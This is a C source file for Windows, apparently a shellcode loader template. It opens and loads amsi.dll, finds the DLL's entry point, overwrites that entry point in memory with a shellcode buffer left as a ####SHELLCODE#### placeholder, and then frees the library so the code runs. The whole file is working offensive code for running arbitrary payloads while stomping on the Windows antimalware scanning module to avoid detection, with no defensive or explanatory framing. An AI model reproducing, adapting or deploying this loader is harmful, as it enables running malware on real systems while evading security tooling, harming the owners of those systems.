#include <windows.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <ctype.h>


unsigned char magiccode[] = ####SHELLCODE####;

int main(int argc, char *argv[])
{
    printf("Starting program...\n");

    // Open the DLL file to read headers
    HANDLE fileHandle = CreateFile("C:\\windows\\system32\\amsi.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (fileHandle == INVALID_HANDLE_VALUE) {
        printf("Failed to open DLL file. Error: %lu\n", GetLastError());
        return 1;
    } else {
		printf("[+] DLL file amsi.dll opened.\n");
	}

    HANDLE fileMapping = CreateFileMapping(fileHandle, NULL, PAGE_READONLY, 0, 0, NULL);
    if (fileMapping == NULL) {
        printf("Failed to create file mapping. Error: %lu\n", GetLastError());
        CloseHandle(fileHandle);
        return 1;
    } else {
		printf("[+] File mapping created.\n");
	}

    LPVOID fileBase = MapViewOfFile(fileMapping, FILE_MAP_READ, 0, 0, 0);
    if (fileBase == NULL) {
        printf("Failed to map view of file. Error: %lu\n", GetLastError());
        CloseHandle(fileMapping);
        CloseHandle(fileHandle);
        return 1;
    } else {
		printf("[+] File mapped.\n");
	 }

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileBase;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)fileBase + dosHeader->e_lfanew);
    DWORD entryPointRVA = ntHeader->OptionalHeader.AddressOfEntryPoint;

    // Load the DLL to get its base address in current process
    HMODULE hDll = LoadLibrary("C:\\windows\\system32\\amsi.dll");

    if (hDll == NULL) {
        printf("Failed to load DLL. Error: %lu\n", GetLastError());
        UnmapViewOfFile(fileBase);
        CloseHandle(fileMapping);
        CloseHandle(fileHandle);
        return 1;
    } else { 
		printf("[+] DLL loaded.\n");
	}

    // Calculate the AddressOfEntryPoint in current process
    LPVOID dllEntryPoint = (LPVOID)(entryPointRVA + (DWORD_PTR)hDll);
	printf("[+] DLL entry point: %p\n", dllEntryPoint);

    // Overwrite the AddressOfEntryPoint with magiccode
    SIZE_T bytesWritten;
    BOOL result = WriteProcessMemory(GetCurrentProcess(), dllEntryPoint, magiccode, sizeof(magiccode), &bytesWritten);
    if (!result) {
        printf("Failed to write magiccode. Error: %lu\n", GetLastError());
        FreeLibrary(hDll);
        UnmapViewOfFile(fileBase);
        CloseHandle(fileMapping);
        CloseHandle(fileHandle);
        return 1;
    } else {
		printf("[+] Magic code written.\n");
	}

    // Create a thread to execute at the DLL's entry point
    // DWORD threadID;
    // HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)dllEntryPoint, NULL, 0, &threadID);
    // if (hThread == NULL) {
    //     printf("Failed to create a thread. Error: %lu\n", GetLastError());
    //     FreeLibrary(hDll);
    //     UnmapViewOfFile(fileBase);
    //     CloseHandle(fileMapping);
    //     CloseHandle(fileHandle);
    //     return 1;
    // }
	printf("[+] No need to create thread.\n");

    // Wait for the thread to execute and then clean up
    // if (WaitForSingleObject(hThread, 5000) == WAIT_TIMEOUT) { // Wait 5 seconds
    //     TerminateThread(hThread, 0); // Forcibly terminates the thread
    //     printf("[+] Default thread was terminated.\n");
    // }

    // Get the exit code of the thread.
    // DWORD exitCode = 0;
    // if (!GetExitCodeThread(hThread, &exitCode)) {
    //     printf("[-] GetExitCodeThread failed: %d\n", GetLastError());
    // } else {
    //     printf("[+] Thread exited with code: %lu\n", exitCode);
    // }

    // CloseHandle(hThread);
    FreeLibrary(hDll);
    UnmapViewOfFile(fileBase);
    CloseHandle(fileMapping);
    CloseHandle(fileHandle);
    // Terminate the process
    ExitProcess(0);
    return 0;


}